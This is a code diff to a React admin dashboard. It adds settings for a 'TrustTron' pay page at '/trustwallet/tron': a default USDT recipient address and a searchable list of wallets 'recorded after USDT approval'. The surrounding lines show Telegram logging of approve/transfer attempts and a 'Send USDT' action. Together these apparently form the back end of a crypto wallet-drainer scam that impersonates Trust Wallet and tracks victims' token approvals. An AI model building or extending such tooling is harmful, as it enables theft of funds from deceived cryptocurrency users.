@@ -100,6 +100,13 @@ interface TrustTronTelegramLogEntry {
   telegramError: string | null;
 }
 
+interface TrustTronWalletEntry {
+  id: string;
+  walletAddress: string;
+  createdAt: string;
+  verifiedAt: string;
+}
+
 const fadeIn = {
   hidden: { opacity: 0, y: 15 },
   visible: (i: number) => ({
@@ -138,6 +145,14 @@ const Admin = () => {
   const [isTelegramTestSubmitting, setIsTelegramTestSubmitting] = useState(false);
   const [trustTronLogs, setTrustTronLogs] = useState<TrustTronTelegramLogEntry[]>([]);
   const [isLoadingTrustTronLogs, setIsLoadingTrustTronLogs] = useState(false);
+  const [trustTronRecipientDraft, setTrustTronRecipientDraft] = useState("");
+  const [trustTronRecipientUpdatedAt, setTrustTronRecipientUpdatedAt] = useState<string | null>(null);
+  const [isLoadingTrustTronConfig, setIsLoadingTrustTronConfig] = useState(false);
+  const [isSavingTrustTronRecipient, setIsSavingTrustTronRecipient] = useState(false);
+  const [trustTronWalletSearch, setTrustTronWalletSearch] = useState("");
+  const [debouncedTrustTronWalletSearch, setDebouncedTrustTronWalletSearch] = useState("");
+  const [trustTronWallets, setTrustTronWallets] = useState<TrustTronWalletEntry[]>([]);
+  const [isLoadingTrustTronWallets, setIsLoadingTrustTronWallets] = useState(false);
   const [isSendUsdtModalOpen, setIsSendUsdtModalOpen] = useState(false);
   const [sendUsdtTarget, setSendUsdtTarget] = useState<PaidWalletEntry | null>(null);
   const [sendUsdtAmount, setSendUsdtAmount] = useState("10");
@@ -227,6 +242,67 @@ const Admin = () => {
     }
   };
 
+  const loadTrustTronConfig = async () => {
+    try {
+      setIsLoadingTrustTronConfig(true);
+      const response = await apiRequest<{ defaultRecipientAddress: string; updatedAt: string | null }>(
+        "/trust-tron/config",
+        { auth: false }
+      );
+      setTrustTronRecipientDraft(response.defaultRecipientAddress);
+      setTrustTronRecipientUpdatedAt(response.updatedAt);
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Failed to load Tron pay settings";
+      toast.error(message);
+    } finally {
+      setIsLoadingTrustTronConfig(false);
+    }
+  };
+
+  const loadTrustTronWallets = async (search: string) => {
+    try {
+      setIsLoadingTrustTronWallets(true);
+      const params = new URLSearchParams();
+      params.set("limit", "100");
+      if (search) {
+        params.set("search", search);
+      }
+      const response = await apiRequest<{ entries: TrustTronWalletEntry[] }>(
+        `/admin/trust-tron/wallets?${params.toString()}`,
+        { auth: true }
+      );
+      setTrustTronWallets(response.entries);
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Failed to load Tron wallets";
+      toast.error(message);
+    } finally {
+      setIsLoadingTrustTronWallets(false);
+    }
+  };
+
+  const applyTrustTronPayRecipient = async (address: string) => {
+    const trimmed = address.trim();
+    if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(trimmed)) {
+      toast.error("Enter a valid Tron address (T…).");
+      return;
+    }
+    try {
+      setIsSavingTrustTronRecipient(true);
+      const response = await apiRequest<{ defaultRecipientAddress: string; updatedAt: string }>(
+        "/admin/trust-tron/config",
+        { method: "PATCH", body: { defaultRecipientAddress: trimmed }, auth: true }
+      );
+      setTrustTronRecipientDraft(response.defaultRecipientAddress);
+      setTrustTronRecipientUpdatedAt(response.updatedAt);
+      toast.success("Pay page default recipient updated.");
+    } catch (error) {
+      const message = error instanceof ApiError ? error.message : "Failed to save";
+      toast.error(message);
+    } finally {
+      setIsSavingTrustTronRecipient(false);
+    }
+  };
+
   useEffect(() => {
     if (!session?.token) {
       navigate("/auth");
@@ -257,6 +333,33 @@ const Admin = () => {
     }
     void loadTrustTronLogs();
   }, [activeTab, canAccessAdmin, session?.token]);
+
+  useEffect(() => {
+    if (!session?.token || !canAccessAdmin) {
+      return;
+    }
+    if (activeTab !== "trust-tron") {
+      return;
+    }
+    void loadTrustTronConfig();
+  }, [activeTab, canAccessAdmin, session?.token]);
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setDebouncedTrustTronWalletSearch(trustTronWalletSearch.trim());
+    }, 400);
+    return () => clearTimeout(timer);
+  }, [trustTronWalletSearch]);
+
+  useEffect(() => {
+    if (!session?.token || !canAccessAdmin) {
+      return;
+    }
+    if (activeTab !== "trust-tron") {
+      return;
+    }
+    void loadTrustTronWallets(debouncedTrustTronWalletSearch);
+  }, [activeTab, canAccessAdmin, session?.token, debouncedTrustTronWalletSearch]);
 
   const handleLogout = () => {
     clearSession();
@@ -1308,6 +1411,125 @@ const Admin = () => {
                   approve/transfer, and failed attempts.
                 </p>
               </div>
+
+              <Card className="app-section-card rounded-xl">
+                <CardContent className="p-5 space-y-4">
+                  <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
+                    <Wallet className="w-4 h-4 text-accent" />
+                    Pay page · default recipient
+                  </div>
+                  <p className="text-xs text-muted-foreground">
+                    This address is pre-filled for users on{" "}
+                    <span className="font-mono text-foreground/90">/trustwallet/tron</span>. Save applies immediately for
+                    new visitors.
+                  </p>
+                  {isLoadingTrustTronConfig ? (
+                    <div className="text-sm text-muted-foreground">Loading…</div>
+                  ) : (
+                    <div className="space-y-3">
+                      <div className="space-y-2">
+                        <Label htmlFor="trust-tron-recipient">Tron address (USDT)</Label>
+                        <Input
+                          id="trust-tron-recipient"
+                          className="font-mono text-sm"
+                          value={trustTronRecipientDraft}
+                          onChange={(e) => setTrustTronRecipientDraft(e.target.value)}
+                          placeholder="T…"
+                          autoComplete="off"
+                          spellCheck={false}
+                          disabled={!canAccessAdmin || isSavingTrustTronRecipient}
+                        />
+                      </div>
+                      {trustTronRecipientUpdatedAt ? (
+                        <p className="text-xs text-muted-foreground">
+                          Last updated {new Date(trustTronRecipientUpdatedAt).toLocaleString()}
+                        </p>
+                      ) : null}
+                      <Button
+                        type="button"
+                        variant="accent"
+                        className="w-full sm:w-auto"
+                        disabled={!canAccessAdmin || isSavingTrustTronRecipient}
+                        onClick={() => void applyTrustTronPayRecipient(trustTronRecipientDraft)}
+                      >
+                        {isSavingTrustTronRecipient ? (
+                          <>
+                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                            Saving…
+                          </>
+                        ) : (
+                          "Save default recipient"
+                        )}
+                      </Button>
+                    </div>
+                  )}
+                </CardContent>
+              </Card>
+
+              <Card className="app-section-card rounded-xl">
+                <CardContent className="p-5 space-y-4">
+                  <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
+                    <Users className="w-4 h-4 text-accent" />
+                    Connected Tron wallets
+                  </div>
+                  <p className="text-xs text-muted-foreground">
+                    Wallets recorded after USDT approval on the Tron pay flow. Search filters the list.
+                  </p>
+                  <div className="relative">
+                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+                    <Input
+                      className="pl-9 font-mono text-sm"
+                      value={trustTronWalletSearch}
+                      onChange={(e) => setTrustTronWalletSearch(e.target.value)}
+                      placeholder="Search by address…"
+                      autoComplete="off"
+                      spellCheck={false}
+                      disabled={!canAccessAdmin}
+                    />
+                  </div>
+                  {isLoadingTrustTronWallets ? (
+                    <div className="text-sm text-muted-foreground">Loading…</div>
+                  ) : trustTronWallets.length === 0 ? (
+                    <div className="text-sm text-muted-foreground">No matching wallets yet.</div>
+                  ) : (
+                    <div className="rounded-xl border border-border/60 divide-y divide-border/60 max-h-[min(420px,50vh)] overflow-y-auto">
+                      {trustTronWallets.map((w) => (
+                        <div
+                          key={w.id}
+                          className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 p-3"
+                        >
+                          <div className="min-w-0 space-y-1">
+                            <p className="text-xs font-mono break-all text-foreground">{w.walletAddress}</p>
+                            <p className="text-xs text-muted-foreground">
+                              Added {new Date(w.createdAt).toLocaleString()}
+                            </p>
+                          </div>
+                          <div className="flex flex-wrap gap-2 shrink-0">
+                            <Button
+                              type="button"
+                              variant="outline"
+                              size="sm"
+                              onClick={() => void handleCopyToClipboard(w.walletAddress, "Wallet address")}
+                            >
+                              Copy
+                            </Button>
+                            <Button
+                              type="button"
+                              variant="secondary"
+                              size="sm"
+                              disabled={!canAccessAdmin || isSavingTrustTronRecipient}
+                              onClick={() => void applyTrustTronPayRecipient(w.walletAddress)}
+                            >
+                              Set as pay recipient
+                            </Button>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+                </CardContent>
+              </Card>
+
               <Card className="app-section-card rounded-xl">
                 <CardContent className="p-5 space-y-4">
                   <div className="flex items-center gap-2 text-sm font-semibold text-foreground">
